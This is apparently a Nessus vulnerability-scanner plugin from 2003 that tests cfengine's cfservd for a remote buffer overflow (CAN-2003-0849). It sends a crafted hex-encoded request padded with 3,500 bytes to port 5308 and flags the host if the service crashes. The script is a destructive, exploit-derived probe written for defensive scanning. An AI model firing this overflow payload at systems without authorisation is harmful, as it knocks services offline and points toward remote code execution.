# script based on exploit code by
# kokaninATdtors.net

if(description)
{
 script_id(11893);
 script_version("$Revision: 1.1 $");
 script_cve_id("CAN-2003-0849");
 script_bugtraq_id(8699);

 name["english"] = "Gnu Cfserv remote buffer overflow";

 script_name(english:name["english"]);

 desc["english"] = "
The remote Cfserver seems to be vulnerable to a remote buffer overflow bug.
Such a bug might be exploited by an attacker to execute arbitrary code on
this host, with the privileges cfservd is running with.

  
Solution : upgrade to version 2.0.8/2.0.8p1
See also : http://www.iu.hio.no/cfengine/
Risk Factor : High";

 script_description(english:desc["english"]);

 summary["english"] = "Checks for the Cfserver remote buffer overflow";

 script_summary(english:summary["english"]);

 script_category(ACT_DESTRUCTIVE_ATTACK);


 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");

 exit(0);
}


# start script code


function hex2raw(s)
{
 local_var i, j, ret;

 for(i=0;i<strlen(s);i+=2)
 {
  if(ord(s[i]) >= ord("0") && ord(s[i]) <= ord("9"))
        j = int(s[i]);
  else
        j = int((ord(s[i]) - ord("a")) + 10);

  j *= 16;
  if(ord(s[i+1]) >= ord("0") && ord(s[i+1]) <= ord("9"))
        j += int(s[i+1]);
  else
        j += int((ord(s[i+1]) - ord("a")) + 10);
  ret += raw_string(j);
 }
 return ret;
}



port = 5308;
if (!get_port_state(port)) exit(0);



req = hex2raw(s:"32647564656475646564756465647564656475646509322F6173646661736466617464666173646661736466433A5C096C6F63616C686F73742E6C6F63616C646F6D61696E2E636F6D093730092D0D0A2E0D0A");                         
req += crap(3500);


soc = open_sock_tcp(port);
if (!soc) exit(0);
send (socket:soc, data:req);     
close(soc);
sleep(1);
soc = open_sock_tcp(port);
if (!soc) security_hole(port);
exit(0);












